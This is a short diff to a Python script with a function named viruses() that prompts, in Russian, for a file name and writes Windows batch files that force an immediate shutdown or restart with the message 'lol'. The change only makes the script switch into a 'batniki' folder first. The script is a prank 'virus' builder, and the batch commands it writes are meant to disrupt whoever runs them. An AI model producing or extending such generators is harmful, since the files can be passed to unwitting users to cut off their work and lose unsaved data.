@@ -981,11 +981,13 @@ def viruses():
 		print(text)
 		bat = int(input('bat-virus~#:'))
 		def bat1():
+			os.chdir('batniki')
 			n = str(input('Имя вашего батника .bat:'))
 			k = open(n,"w",encoding='utf-8')
 			k.write("""@echo off shutdown -s -t 1 -c "lol" >nul""")
 			k.close()
 		def bat2():
+			os.chdir('batniki')
 			n = str(input('Имя вашего батника .bat:'))
 			k = open(n,"w",encoding='utf-8')
 			k.write("""@echo off shutdown -r -t 1 -c "lol" >nul""")
